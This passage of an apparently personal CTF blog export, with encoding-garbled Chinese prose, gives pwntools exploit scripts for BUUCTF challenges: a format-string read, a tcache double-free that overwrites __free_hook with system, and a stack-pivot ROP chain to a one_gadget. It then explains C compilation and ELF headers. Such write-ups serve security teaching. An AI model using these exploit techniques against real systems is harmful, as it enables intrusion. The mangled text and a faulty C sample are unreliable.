¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œæˆ‘ä»¬ç›´æ¥åœ¨æ ˆä¸Šæ‰¾åˆ°æ ¼å¼åŒ–å­—ç¬¦ä¸²å‚æ•°çš„ä½ç½®ï¼Œç„¶åç›´æ¥è¯»å‡ºæ¥å³å¯</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">binary = <span class="string">&quot;./judgement_mna_2016&quot;</span></span><br><span class="line">port = <span class="string">&quot;29113&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span>:</span><br><span class="line">p = process(binary)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,port)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span>():</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Input flag &gt;&gt; &quot;</span>)</span><br><span class="line">payload = <span class="string">&quot;%28$s&quot;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="ciscn-2019-en-3"><a href="#ciscn-2019-en-3" class="headerlink" title="ciscn_2019_en_3"></a>ciscn_2019_en_3</h2><ul><li>è€ƒç‚¹<ol><li>ç¨‹åºè°ƒè¯•ï¼Œæ ˆæº¢å‡ºæ³„æ¼åœ°å€</li><li>libc-2.27 UAF</li></ol></li></ul><p><a href="https://sm.ms/image/iCz5hIJNQDXTvlr" target="_blank"><img src="https://i.loli.net/2021/03/14/iCz5hIJNQDXTvlr.png" /></a></p><p>ç¨‹åºå…ˆç»™äº†ä¸€ä¸ªè¾“å…¥nameå’Œidçš„ä¸œè¥¿ï¼Œå‘ç°äº†æ ¼å¼åŒ–å­—ç¬¦ä¸²ä½†æ˜¯ç”±äºæ˜¯__printf_chkï¼Œæ‰€ä»¥æ²¡æ‰¾åˆ°å¥½çš„åˆ©ç”¨ç‚¹<br>ç„¶åä¸‹é¢æ˜¯è¾“å…¥idï¼Œè¿˜æœ‰ä¸ªputsï¼Œè°ƒè¯•å‘ç°idåé¢æ˜¯æœ‰libcå‡½æ•°setbufferçš„ï¼Œåˆå› ä¸ºæ˜¯putså‡½æ•°ç›´æ¥æ¥ç»™ä»–æ³„æ¼å‡ºæ¥<br><a href="https://sm.ms/image/3nmz2dy6jRKb9Pi" target="_blank"><img src="https://i.loli.net/2021/03/14/3nmz2dy6jRKb9Pi.png" /></a></p><p>addåŠŸèƒ½åªå…è®¸ç”³è¯·0-0x50å¤§å°çš„chunk<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;size);</span><br><span class="line">  <span class="keyword">if</span> ( size &lt; <span class="number">0</span> &amp;&amp; size &gt; <span class="number">0x50</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br></pre></td></tr></table></figure><br>deleteåŠŸèƒ½å­˜åœ¨UAF<br>åœ¨è€ç‰ˆçš„libc-2.27ä¸‹æ˜¯å…è®¸double freeå­˜åœ¨çš„<br>ç„¶åç›´æ¥æ”¹__free_hookä¸ºsystemä¸€æŠŠæ¢­å°±è¡Œäº†<br>æ–°ç‰ˆçš„æ‰“å®Œä»Šå¤©çš„VNå†è¯•ä¸€ä¸‹</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">binary = <span class="string">&quot;./ciscn_2019_en_3&quot;</span></span><br><span class="line">libc_path = <span class="string">&#x27;../libc-2.27.so&#x27;</span></span><br><span class="line">port = <span class="string">&quot;27391&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span>:</span><br><span class="line">p = process(binary)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,port)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span>():</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak_libc</span>(<span class="params">addr</span>):</span></span><br><span class="line"><span class="keyword">global</span> libc_base,__malloc_hook,__free_hook,system,binsh_addr,_IO_2_1_stdout_</span><br><span class="line">libc = ELF(libc_path)</span><br><span class="line">libc_base = addr - libc.sym[<span class="string">&#x27;setbuffer&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;[*] libc base:&quot;</span>,<span class="built_in">hex</span>(libc_base))</span><br><span class="line">__malloc_hook = libc_base + libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="comment"># binsh_addr = libc_base + libc.search(&#x27;/bin/sh&#x27;).next()</span></span><br><span class="line">__free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">_IO_2_1_stdout_ = libc_base + libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,content</span>):</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Input your choice&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Please input the size of story:&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">p.sendafter(<span class="string">&#x27;please inpute the story:&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Input your choice:&#x27;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Please input the index:&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;What&#x27;s your name?&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;A13x&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Please input your ID.&quot;</span>)</span><br><span class="line">p.send(<span class="string">&quot;aaaaaaaa&quot;</span>)</span><br><span class="line"></span><br><span class="line">leak = u64(p.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>)) - <span class="number">231</span></span><br><span class="line">leak_libc(leak)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x50</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">add(<span class="number">0x50</span>,<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x50</span>,p64(__free_hook))</span><br><span class="line">add(<span class="number">0x50</span>,<span class="string">&quot;A13x&quot;</span>)</span><br><span class="line">add(<span class="number">0x50</span>,p64(system))</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> buuctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwn-actfæ ˆè¿ç§»</title>
      <link href="2021/03/12/pwn-actf%E6%A0%88%E8%BF%81%E7%A7%BB/"/>
      <url>2021/03/12/pwn-actf%E6%A0%88%E8%BF%81%E7%A7%BB/</url>
      
        <content type="html"><![CDATA[<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><p>ç»™å‡ºexpå¦‚ä¸‹</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">binary = <span class="string">&quot;./ACTF_2019_babystack&quot;</span></span><br><span class="line">libc_path = <span class="string">&#x27;../libc-2.27.so&#x27;</span></span><br><span class="line">port = <span class="string">&quot;29886&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span>:</span><br><span class="line">p = process(binary)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,port)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span>():</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak_libc</span>(<span class="params">addr</span>):</span></span><br><span class="line"><span class="keyword">global</span> libc_base,__malloc_hook,__free_hook,system,binsh_addr,_IO_2_1_stdout_</span><br><span class="line">libc = ELF(libc_path)</span><br><span class="line">libc_base = addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;[*] libc base:&quot;</span>,<span class="built_in">hex</span>(libc_base))</span><br><span class="line">__malloc_hook = libc_base + libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="comment"># binsh_addr = libc_base + libc.search(&#x27;/bin/sh&#x27;).next()</span></span><br><span class="line">__free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">_IO_2_1_stdout_ = libc_base + libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>]</span><br><span class="line"></span><br><span class="line">elf = ELF(binary)</span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">0xe0</span>))</span><br><span class="line">p.recvuntil(<span class="string">&quot;Your message will be saved at 0x&quot;</span>)</span><br><span class="line">stack = <span class="built_in">int</span>(p.recv(<span class="number">12</span>),base = <span class="number">16</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi_ret = <span class="number">0x0000000000400ad3</span> <span class="comment"># pop rdi ; ret</span></span><br><span class="line">leave_ret = <span class="number">0x0000000000400a18</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload = payload + p64(<span class="number">0</span>)</span><br><span class="line">payload = payload + p64(pop_rdi_ret)</span><br><span class="line">payload = payload + p64(elf.got[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload = payload + p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload = payload + p64(<span class="number">0x4008f6</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0xd0</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">payload = payload + p64(stack)</span><br><span class="line">payload = payload + p64(leave_ret)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">leak = u64(p.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">leak_libc(leak)</span><br><span class="line">og = libc_base + <span class="number">0x4f2c5</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">0xe0</span>))</span><br><span class="line">p.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">p.send(<span class="number">0xd8</span> * <span class="string">b&#x27;\x00&#x27;</span> + p64(og))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="åˆ†æå›é¡¾æ ˆè¿ç§»"><a href="#åˆ†æå›é¡¾æ ˆè¿ç§»" class="headerlink" title="åˆ†æå›é¡¾æ ˆè¿ç§»"></a>åˆ†æå›é¡¾æ ˆè¿ç§»</h2><p>æ²¡æœ‰å¼€PIEä¿æŠ¤å’ŒCanary</p><ul><li>IDAåˆ†æç»“æœå¦‚ä¸‹<br><img src="https://i.loli.net/2021/03/12/zGy2nY6fm3SCPN5.png" /></li></ul><p>é¢˜ç›®ç»™å‡ºæ ˆåœ°å€ï¼Œæˆ‘ä»¬å¯ä»¥å°†æ ˆè¿ç§»åˆ°æ ˆä¸Šï¼Œå¸ƒç½®gadgetæ³„æ¼libcåœ°å€ç„¶åone_gadgetä¸€æŠŠæ¢­</p><ul><li>æ ˆå¸§ç»“æ„å¦‚ä¸‹<br><img src="https://i.loli.net/2021/03/12/FjcnmS6bw1JlXxa.png" /></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> æ ˆè¿ç§» </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>äºŒè¿›åˆ¶ç¨‹åºä»æºæ–‡ä»¶åˆ°å¯æ‰§è¡Œç¨‹åºçš„è¿‡ç¨‹</title>
      <link href="2021/03/09/binary-programming/"/>
      <url>2021/03/09/binary-programming/</url>
      
        <content type="html"><![CDATA[<p>åœ¨cè¯­è¨€ä¸­ï¼Œæˆ‘ä»¬éƒ½çŸ¥é“ä¸€ä¸ªæºç¨‹åºä»æºç åˆ°å¯æ‰§è¡Œæ–‡ä»¶éƒ½è¦ç»å†é¢„å¤„ç†ï¼Œç¼–è¯‘ï¼Œæ±‡ç¼–å’Œé“¾æ¥çš„è¿‡ç¨‹ï¼Œæœ€ç»ˆå½¢æˆå¯æ‰§è¡Œæ–‡ä»¶ï¼Œç„¶åæ‰è¢«æ“ä½œç³»ç»Ÿè£…è½½è¿›å†…å­˜è¿è¡Œã€‚</p><p>ä¸ºäº†å¤ä¹ pwnçŸ¥è¯†ï¼Œå†™ä¸ªæ–‡ç« æ¥æ¢ç©¶ä¸€ä¸‹ç»å¸¸è¢«æˆ‘å¿½ç•¥çš„å…³äºç¨‹åºçš„ä¸­é—´è¿‡ç¨‹ã€‚</p><h2 id="é¢„ç¼–è¯‘"><a href="#é¢„ç¼–è¯‘" class="headerlink" title="é¢„ç¼–è¯‘"></a>é¢„ç¼–è¯‘</h2><p>è¯¥è¿‡ç¨‹ä¸»è¦å¤„ç†æºä»£ç ä¸­ä»¥â€™#â€™å¼€å§‹çš„é¢„ç¼–è¯‘æŒ‡ä»¤<br>å…·ä½“å¤„ç†è§„åˆ™å¦‚ä¸‹ï¼š</p><ul><li>åˆ é™¤#defineå¹¶å±•å¼€æ‰€æœ‰çš„å®å®šä¹‰</li><li>å¤„ç†æ‰€æœ‰æ¡ä»¶é¢„ç¼–è¯‘æŒ‡ä»¤ï¼šå¦‚ â€œ#ifâ€ç­‰</li><li>å¤„ç†â€#includeâ€é¢„ç¼–è¯‘æŒ‡ä»¤ï¼Œå°†è¢«åŒ…å«çš„æ–‡ä»¶æ’å…¥åˆ°è¯¥é¢„ç¼–è¯‘æŒ‡ä»¤çš„ä½ç½®</li><li>åˆ é™¤æ³¨é‡Šï¼Œæ·»åŠ è¡Œå·å’Œæ–‡ä»¶åæ ‡è¯†</li></ul><p>é¢„ç¼–è¯‘çš„è¿‡ç¨‹å¯ç”¨å¦‚ä¸‹æŒ‡ä»¤æ¥æ‰§è¡Œ </p><p><code>gcc -E BinaryName.c -o BinaryName.i</code></p><p>æºä»£ç å¦‚ä¸‹ï¼š<br><img src="https://i.loli.net/2021/03/09/AMG6ofRz71mCxev.png" style="zoom:50%;"/></p><p>ç»è¿‡é¢„ç¼–è¯‘åï¼š<br><img src="https://i.loli.net/2021/03/09/oQRzCvZfhs38HTy.png" style="zoom:50%;"/></p><h2 id="ç¼–è¯‘"><a href="#ç¼–è¯‘" class="headerlink" title="ç¼–è¯‘"></a>ç¼–è¯‘</h2><p>ç¼–è¯‘è¿‡ç¨‹ç»è¿‡ä¸€ç³»åˆ—è¯æ³•åˆ†æç­‰æ­¥éª¤ç”Ÿæˆæ±‡ç¼–ä»£ç æ–‡ä»¶ï¼Œæ˜¯ç¨‹åºæ„å»ºçš„æ ¸å¿ƒéƒ¨åˆ†<br>ä¸åŒçš„æ“ä½œç³»ç»Ÿæœ‰ä¸åŒçš„ç¼–è¯‘å™¨ï¼Œæ¯”å¦‚Linuxä¸‹çš„gccï¼Œg++ï¼ŒWindowsä¸‹çš„MSVCCLç­‰ï¼ˆåæ–‡éƒ½ä»¥Linuxå¹³å°ä¸‹æ¥æ¢ç©¶ï¼‰<br>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨<code>gcc -S BinaryName.i -o BinaryName.s</code>æˆ–è€…<code>gcc -S BinaryName -o BinaryName.s</code>æ¥æŸ¥çœ‹ç»è¿‡ç¼–è¯‘åçš„æ–‡ä»¶</p><p><img src="https://i.loli.net/2021/03/09/bps3QmPGn5ScZJr.png" style="zoom:50%;"/></p><h2 id="æ±‡ç¼–"><a href="#æ±‡ç¼–" class="headerlink" title="æ±‡ç¼–"></a>æ±‡ç¼–</h2><p>æ±‡ç¼–è¿‡ç¨‹å¯ä»¥å°†æ±‡ç¼–ä»£ç è½¬å˜ä¸ºæœºå™¨å¯ä»¥æ‰§è¡Œçš„æŒ‡ä»¤<br><code>gcc -c BinaryName.s -o BinaryName.o</code>æˆ–<br><code>gcc -c BinaryName.c -o BinaryName.o</code></p><h2 id="ç›®æ ‡æ–‡ä»¶"><a href="#ç›®æ ‡æ–‡ä»¶" class="headerlink" title="ç›®æ ‡æ–‡ä»¶"></a>ç›®æ ‡æ–‡ä»¶</h2><p>æˆ‘ä»¬å…ˆçœ‹ä¸‹cè¯­è¨€æºä»£ç ä¸­çš„å˜é‡å’Œå‡½æ•°</p><h3 id="cè¯­è¨€æºä»£ç ä¸­çš„å˜é‡å’Œå‡½æ•°"><a href="#cè¯­è¨€æºä»£ç ä¸­çš„å˜é‡å’Œå‡½æ•°" class="headerlink" title="cè¯­è¨€æºä»£ç ä¸­çš„å˜é‡å’Œå‡½æ•°"></a>cè¯­è¨€æºä»£ç ä¸­çš„å˜é‡å’Œå‡½æ•°</h3><ul><li>å£°æ˜å’Œå®šä¹‰çš„åŒºåˆ«ï¼š<ul><li>å£°æ˜æ˜¯å‘Šè¯‰ç¼–è¯‘å™¨è¯¥å˜é‡æ²¡æœ‰åœ¨å½“å‰æ–‡ä»¶ä¸­å®šä¹‰è€Œæ˜¯åœ¨å…¶ä»–æ–‡ä»¶ä¸­å®šä¹‰</li><li>å®šä¹‰å˜é‡æ˜¯å‘Šè¯‰ç¼–è¯‘å™¨åœ¨ç”Ÿæˆçš„ç›®æ ‡æ–‡ä»¶ä¸­ç•™å‡ºç©ºé—´æ¥å­˜æ”¾è¯¥å˜é‡</li><li>å®šä¹‰å‡½æ•°æ˜¯å‘Šè¯‰ç¼–è¯‘å™¨åœ¨ç›®æ ‡æ–‡ä»¶ä¸­ç”Ÿæˆè¯¥å‡½æ•°çš„äºŒè¿›åˆ¶ä»£ç </li></ul></li></ul><p>å˜é‡ç±»å‹å¦‚ä¸‹ï¼š</p><ol><li>å…¨å±€å˜é‡ï¼šéstaticï¼Œè¡¨ç¤ºè¯¥å˜é‡çš„ç”Ÿå‘½å‘¨æœŸæ˜¯æ•´ä¸ªç¨‹åºçš„æ‰§è¡ŒæœŸé—´ï¼Œå¯ä»¥è¢«å…¶ä»–æ–‡ä»¶è®¿é—®</li><li>å…¨å±€å˜é‡ï¼šstaticï¼Œç”Ÿå‘½å‘¨æœŸä¹Ÿæ˜¯æ•´ä¸ªç¨‹åºçš„æ‰§è¡ŒæœŸé—´ï¼Œä½†æ˜¯ä¸èƒ½è¢«å…¶ä»–æ–‡ä»¶è®¿é—®</li><li>å±€éƒ¨å˜é‡ï¼šstaticï¼Œç”Ÿå‘½å‘¨æœŸæ˜¯ç¨‹åºçš„æ‰§è¡ŒæœŸé—´ï¼Œä½†æ˜¯ä½œç”¨åŸŸä»…åœ¨è¯¥å‡½æ•°ä½“ä¸­</li><li>å±€éƒ¨å˜é‡ï¼šéstaticï¼Œä»…å­˜åœ¨äºå½“å‰å½“å‰å‡½æ•°ä½“ä¸­</li></ol><p>å¯¹äºå‡½æ•°ä¹ŸåŒç†ï¼Œå¦‚æœå®šä¹‰äº†staticåˆ™æ— æ³•è¢«å…¶ä»–æ–‡ä»¶æ‰€è¯»å–</p><h3 id="ç›®æ ‡æ–‡ä»¶çš„æ ¼å¼"><a href="#ç›®æ ‡æ–‡ä»¶çš„æ ¼å¼" class="headerlink" title="ç›®æ ‡æ–‡ä»¶çš„æ ¼å¼"></a>ç›®æ ‡æ–‡ä»¶çš„æ ¼å¼</h3><p>éƒ¨åˆ†æ®µåå¦‚ä¸‹</p><ul><li>.dataæ®µä¿å­˜å·²ç»åˆå§‹åŒ–çš„å…¨å±€é™æ€å˜é‡å’Œå±€éƒ¨é™æ€å˜é‡</li><li>.rodataæ®µå­˜æ”¾çš„æ˜¯åªè¯»æ•°æ®ï¼Œä¸€èˆ¬æ˜¯ç¨‹åºé‡Œé¢çš„åªè¯»å˜é‡ï¼ˆconstä¿®é¥°çš„ï¼‰å’Œå­—ç¬¦ä¸²å¸¸é‡</li><li>.bssæ®µå­˜æ”¾çš„æ˜¯æœªåˆå§‹åŒ–çš„å…¨å±€å˜é‡å’Œå±€éƒ¨é™æ€å˜é‡</li><li>.commentå­˜æ”¾çš„æ˜¯ç¼–è¯‘å™¨ç‰ˆæœ¬ä¿¡æ¯</li><li>.debugå­˜æ”¾è°ƒè¯•ä¿¡æ¯</li><li>.dynamicå­˜æ”¾åŠ¨æ€é“¾æ¥ä¿¡æ¯</li><li>.strtab String Tableå­—ç¬¦ä¸²è¡¨ï¼Œç”¨äºå­˜æ”¾ELFæ–‡ä»¶ä¸­ç”¨åˆ°çš„å„ç§å­—ç¬¦ä¸²</li><li>.symtab Symbol Tableç¬¦å·è¡¨</li><li>.plt .got åŠ¨æ€é“¾æ¥çš„è·³è½¬è¡¨å’Œå…¨å±€å…¥å£è¡¨</li><li>.init ç¨‹åºåˆå§‹åŒ–æ®µ</li><li>.fini ç¨‹åºç»ˆç»“ä»£ç æ®µ</li></ul><p>ELFæ–‡ä»¶å¤´ç»“æ„ä½“å¦‚ä¸‹</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span>        e_ident[EI_NIDENT];        <span class="comment">/* Magic number and other info */</span></span><br><span class="line">  Elf32_Half        e_type;                        <span class="comment">/* Object file type */</span></span><br><span class="line">  Elf32_Half        e_machine;                <span class="comment">/* Architecture */</span></span><br><span class="line">  Elf32_Word        e_version;                <span class="comment">/* Object file version */</span></span><br><span class="line">  Elf32_Addr        e_entry;                <span class="comment">/* Entry point virtual address */</span></span><br><span class="line">  Elf32_Off        e_phoff;                <span class="comment">/* Program header table file offset */</span></span><br><span class="line">  Elf32_Off        e_shoff;                <span class="comment">/* Section header table file offset */</span></span><br><span class="line">  Elf32_Word        e_flags;                <span class="comment">/* Processor-specific flags */</span></span><br><span class="line">  Elf32_Half        e_ehsize;                <span class="comment">/* ELF header size in bytes */</span></span><br><span class="line">  Elf32_Half        e_phentsize;                <span class="comment">/* Program header table entry size */</span></span><br><span class="line">  Elf32_Half        e_phnum;                <span class="comment">/* Program header table entry count */</span></span><br><span class="line">  Elf32_Half        e_shentsize;                <span class="comment">/* Section header table entry size */</span></span><br><span class="line">  Elf32_Half        e_shnum;                <span class="comment">/* Section header table entry count */</span></span><br><span class="line">  Elf32_Half        e_shstrndx;                <span class="comment">/* Section header string table index */</span></span><br><span class="line">&#125; Elf32_Ehdr;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span>        e_ident[EI_NIDENT];        <span class="comment">/* Magic number and other info */</span></span><br><span class="line">  Elf64_Half        e_type;                        <span class="comment">/* Object file type */</span></span><br><span class="line">  Elf64_Half        e_machine;                <span class="comment">/* Architecture */</span></span><br><span class="line">  Elf64_Word        e_version;                <span class="comment">/* Object file version */</span></span><br><span class="line">  Elf64_Addr        e_entry;                <span class="comment">/* Entry point virtual address */</span></span><br><span class="line">  Elf64_Off        e_phoff;                <span class="comment">/* Program header table file offset */</span></span><br><span class="line">  Elf64_Off        e_shoff;                <span class="comment">/* Section header table file offset */</span></span><br><span class="line">  Elf64_Word        e_flags;                <span class="comment">/* Processor-specific flags */</span></span><br><span class="line">  Elf64_Half        e_ehsize;                <span class="comment">/* ELF header size in bytes */</span></span><br><span class="line">  Elf64_Half        e_phentsize;                <span class="comment">/* Program header table entry size */</span></span><br><span class="line">  Elf64_Half        e_phnum;                <span class="comment">/* Program header table entry count */</span></span><br><span class="line">  Elf64_Half        e_shentsize;                <span class="comment">/* Section header table entry size */</span></span><br><span class="line">  Elf64_Half        e_shnum;                <span class="comment">/* Section header table entry count */</span></span><br><span class="line">  Elf64_Half        e_shstrndx;                <span class="comment">/* Section header string table index */</span></span><br><span class="line">&#125; Elf64_Ehdr;</span><br></pre></td></tr></table></figure><p>ELF headerç»“æ„ä½“å¦‚ä¸‹<br><img src="https://i.loli.net/2021/03/09/VwWutzkDLN934Zy.png" style="zoom:50%;" /></p><h3 id="æºä»£ç åˆ°ç›®æ ‡æ–‡ä»¶çš„å¤„ç†"><a href="#æºä»£ç åˆ°ç›®æ ‡æ–‡ä»¶çš„å¤„ç†" class="headerlink" title="æºä»£ç åˆ°ç›®æ ‡æ–‡ä»¶çš„å¤„ç†"></a>æºä»£ç åˆ°ç›®æ ‡æ–‡ä»¶çš„å¤„ç†</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> globalA = <span class="number">2333</span>;</span><br><span class="line"><span class="keyword">int</span> globalB;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> globalC = <span class="number">666</span>;  <span class="comment">// å…¨å±€static</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> globalD;</span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">int</span> globalE; <span class="comment">// å£°æ˜å…¨å±€å˜é‡</span></span><br><span class="line"><span class="function"><span class="keyword">extern</span> <span class="keyword">int</span> <span class="title">Print</span><span class="params">()</span></span>; <span class="comment">// å£°æ˜å‡½æ•°</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">(<span class="keyword">int</span> a)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> n;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> a = <span class="number">123</span>;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> b;</span><br><span class="line"><span class="keyword">int</span> c = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">int</span> d;</span><br><span class="line">test(<span class="number">12</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é€šè¿‡nmå‘½ä»¤æ¥æŸ¥çœ‹ç›®æ ‡æ–‡ä»¶çš„ç¬¦å·ï¼Œä»å·¦åˆ°å³åˆ†åˆ«æ˜¯å˜é‡çš„ç›¸å¯¹åœ°å€ï¼Œå˜é‡æ‰€åœ¨æ®µçš„åå­—å’Œå˜é‡åå­—ã€‚<br><img src="https://i.loli.net/2021/03/09/15H7DNjxQdUslnV.png" style="zoom:50%;" ></p><p>å…¶ä¸­a.1922æ˜¯ç¼–è¯‘å™¨ä¿®æ”¹å˜é‡åå­—çš„ç»“æœï¼Œå› 